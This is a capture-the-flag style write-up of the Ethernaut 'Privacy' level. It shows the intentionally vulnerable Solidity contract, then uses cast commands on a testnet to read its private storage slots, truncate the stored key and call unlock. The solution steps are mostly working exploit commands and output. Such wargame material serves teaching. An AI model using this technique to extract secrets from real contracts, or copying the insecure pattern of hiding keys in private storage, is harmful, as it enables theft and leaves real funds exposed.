---
title: "Privacy"
tags: ["Storage", "Type Casting"]
reference: https://ethernaut.openzeppelin.com/level/12
---

# Description

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

- Understanding how storage works
- Understanding how parameter parsing works
- Understanding how casting works

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```

# Solution

1. like the level 8, we can see all the state variables

2. find the value of `data` variable

> Structs and array data always start a new slot and their items are packed tightly according to these rules.

```sol
bool public locked = true; // slot 0
uint256 public ID = block.timestamp; // slot 1  
uint8 private flattening = 10; // slot 2
uint8 private denomination = 255; // slot 2
uint16 private awkwardness = uint16(block.timestamp); // slot 2
bytes32[3] private data; // slot 3 to 5
```

```bash
tim@tim-virtual-machine ~> cast storage 0xCfb1465085d3631Db97d5654D69621DC2E6169cc 2 --rpc-url $BASE_SEPOLIA_RPC
0x000000000000000000000000000000000000000000000000000000007edcff0a // flattening=0a, denomination=ff, awkwardness=7edc
tim@tim-virtual-machine ~> cast storage 0xCfb1465085d3631Db97d5654D69621DC2E6169cc 3 --rpc-url $BASE_SEPOLIA_RPC
0xe4f8e8b9f036b09b818a9685b05a36941e0e6ad00745931fccedf689ca14f3b8  // data[0]
tim@tim-virtual-machine ~> cast storage 0xCfb1465085d3631Db97d5654D69621DC2E6169cc 4 --rpc-url $BASE_SEPOLIA_RPC
0x6e160a1da387a6e207e8586df9343d3ed511b391ce5cd653708b196d1ab42e84  // data[1]
tim@tim-virtual-machine ~> cast storage 0xCfb1465085d3631Db97d5654D69621DC2E6169cc 5 --rpc-url $BASE_SEPOLIA_RPC
0xfeeba9c99ae96259ae2d28d8d50698e7a00112881d6a7fd2168743f73d328ddb // data[2]
tim@tim-virtual-machine ~> cast storage 0xCfb1465085d3631Db97d5654D69621DC2E6169cc 6 --rpc-url $BASE_SEPOLIA_RPC
0x0000000000000000000000000000000000000000000000000000000000000000 // all 0 which is expected
```

3. cast data[2] to bytes16 data type

> if length of m is greater than 16, truncation will happen. ref: https://docs.soliditylang.org/en/latest/types.html#reference-types


```
tim@tim-virtual-machine ~ [2]> echo "0xfeeba9c99ae96259ae2d28d8d50698e7a00112881d6a7fd2168743f73d328ddb" | cut -c1-34
0xfeeba9c99ae96259ae2d28d8d50698e7
```

4. unlock

```
cast send 0xCfb1465085d3631Db97d5654D69621DC2E6169cc "unlock(bytes16)" 0xfeeba9c99ae96259ae2d28d8d50698e7 --rpc-url $BASE_SEPOLIA_RPC --private-key
```
